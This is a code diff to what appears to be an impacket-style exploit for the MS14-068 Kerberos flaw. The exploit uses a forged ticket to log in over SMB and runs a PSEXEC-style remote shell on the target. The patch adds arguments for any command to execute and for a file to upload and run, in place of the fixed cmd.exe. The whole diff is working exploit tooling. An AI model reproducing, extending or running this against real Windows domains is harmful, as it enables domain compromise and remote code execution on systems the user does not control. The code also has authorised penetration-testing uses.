@@ -295,13 +295,13 @@ RemComSTDERR         = "RemCom_stderr"
 lock = Lock()
 
 class PSEXEC:
-    def __init__(self, command, username, domain, smbConnection, TGS):
+    def __init__(self, command, username, domain, smbConnection, TGS, copyFile):
         self.__username = username
         self.__command = command
         self.__path = None
         self.__domain = domain
         self.__exeFile = None
-        self.__copyFile = None
+        self.__copyFile = copyFile
         self.__TGS = TGS
         self.__smbConnection = smbConnection
 
@@ -508,7 +508,7 @@ class RemoteShell(cmd.Cmd):
     def connect_transferClient(self):
         self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
         user, passwd, domain, lm, nt = self.credentials
-        self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, TGS=self.TGS)
+        self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, TGS=self.TGS, useCache=False)
 
     def do_help(self, line):
         print """
@@ -614,7 +614,7 @@ class MS14_068():
             ('Data', PKERB_VALIDATION_INFO),
         )
 
-    def __init__(self, target, kdchost = None, username = '', password = '', domain='', hashes = None):
+    def __init__(self, target, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -623,6 +623,8 @@ class MS14_068():
         self.__nthash = ''
         self.__target = target
         self.__kdcHost = None
+        self.__copyFile = copyFile
+        self.__command = command
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
             self.__lmhash = self.__lmhash.decode('hex')
@@ -1022,9 +1024,9 @@ class MS14_068():
 
         from impacket.smbconnection import SMBConnection
         s = SMBConnection('*SMBSERVER', self.__target)
-        s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS)
+        s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)
 
-        executer = PSEXEC('cmd.exe', username, domain, s, TGS)
+        executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
         executer.run(self.__target)
         #s.connectTree('C$')
         #print s.listPath('C$','/*')
@@ -1064,6 +1066,8 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
     parser.add_argument('target', action='store', help='[domain/][username[:password]@]<address>')
+    parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe')
+    parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
 
     group = parser.add_argument_group('authentication')
 
@@ -1092,7 +1096,11 @@ if __name__ == '__main__':
         from getpass import getpass
         password = getpass("Password:")
 
-    dumper = MS14_068(address, None, username, password, domain, options.hashes)
+    commands = ' '.join(options.command)
+    if commands == ' ':
+        commands = 'cmd.exe'
+
+    dumper = MS14_068(address, None, username, password, domain, options.hashes, commands, options.c)
 
     try:
         dumper.exploit()
